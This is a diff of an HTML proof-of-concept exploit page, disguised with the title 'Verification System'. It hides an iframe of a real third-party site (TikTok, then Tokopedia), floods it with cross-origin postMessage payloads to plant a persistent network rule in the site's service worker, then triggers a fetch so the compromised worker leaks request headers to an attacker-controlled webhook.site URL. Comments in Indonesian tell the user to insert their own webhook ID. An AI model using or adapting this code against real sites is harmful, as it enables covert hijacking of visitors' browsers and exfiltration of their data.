@@ -1,31 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Service Verification System</title>
+    <title>Verification System</title>
 </head>
 <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
     <div style="border: 1px solid #0f0; display: inline-block; padding: 20px;">
-        <h1 id="status">[ INITIALIZING ]</h1>
-        <p id="sub-status">Preparing Zero-Click Tunnel...</p>
+        <h1 id="status">[ PHASE 1: TARGETING ]</h1>
+        <p id="sub-status">Locating vulnerable Service Worker scope...</p>
     </div>
 
     <iframe id="pwn_gate" 
-            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
+            src="https://shop-id.tokopedia.com/manifest.json" 
             style="display:none;"></iframe>
 
     <script>
         const gate = document.getElementById('pwn_gate');
         const statusH1 = document.getElementById('status');
         const statusP = document.getElementById('sub-status');
-        
-        // GANTI INI DENGAN ID WEBHOOK LU
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI ID LU
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "zero_click_final_v5_stable",
+                ruleName: "final_pwn_stable",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -37,51 +35,43 @@
             }]
         };
 
-        function log(h1, p) {
-            statusH1.innerText = h1;
-            statusP.innerText = p;
-            console.log(h1 + ": " + p);
-        }
-
         gate.onload = function() {
-            log("[ GATE OPEN ]", "Waking up Service Worker...");
-            
-            // 1. Kirim sinyal pancingan agar SW aktif (Wake-up call)
+            statusH1.innerText = "[ PHASE 2: INJECTING ]";
+            statusP.innerText = "Bypassing Origin Restrictions...";
+
+            // 1. Kirim pesan aktivasi
             gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
 
             setTimeout(() => {
-                log("[ INJECTING ]", "Firing persistent payload sequence...");
-                
-                // 2. Tembakkan payload berkali-kali untuk menjamin masuk ke listener message
+                // 2. Tembakkan payload inti
                 let count = 0;
                 const bomb = setInterval(() => {
-                    try {
-                        gate.contentWindow.postMessage(payload, "*");
-                    } catch(e) {}
-                    
+                    gate.contentWindow.postMessage(payload, "*");
                     count++;
-                    if (count > 40) {
+                    if (count > 50) {
                         clearInterval(bomb);
-                        log("[ WAITING ]", "Allowing 7s for Cache Storage persistence...");
+                        statusH1.innerText = "[ PHASE 3: PERSISTING ]";
+                        statusP.innerText = "Syncing with Cache Storage (10s)...";
                         
-                        // 3. JEDA KRUSIAL: Memberi waktu SW menulis ke Cache Storage
-                        setTimeout(executeFinalTrigger, 7000);
+                        // 3. Jeda lebih lama (10 detik) untuk memastikan penulisan cache selesai
+                        setTimeout(verifyAndTrigger, 10000);
                     }
-                }, 150);
+                }, 100);
             }, 1000);
         };
 
-        function executeFinalTrigger() {
-            log("[ TRIGGERING ]", "Sending fetch request through Service Worker...");
+        function verifyAndTrigger() {
+            statusH1.innerText = "[ PHASE 4: TRIGGERING ]";
+            statusP.innerText = "Executing intercept request...";
             
-            // 4. Trigger fetch ke endpoint yang sama (200 OK)
-            // Ini akan memaksa SW yang sudah terinfeksi mengirim header ke webhook lu
-            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
+            // 4. Trigger fetch ke manifest lagi agar diintersep oleh SW yang sudah terinfeksi
+            fetch("https://shop-id.tokopedia.com/manifest.json", { 
                 mode: 'no-cors',
                 cache: 'no-store' 
             }).then(() => {
-                log("[ DONE ]", "Check Reqable or Webhook for X-Pns-Referrer");
-                console.log("PoC Finished. Verify via Cache Storage if header is missing.");
+                statusH1.innerText = "[ COMPLETED ]";
+                statusP.innerText = "Check Reqable for X-Pns-Referrer on manifest.json";
+                console.log("PoC Finished.");
             });
         }
     </script>
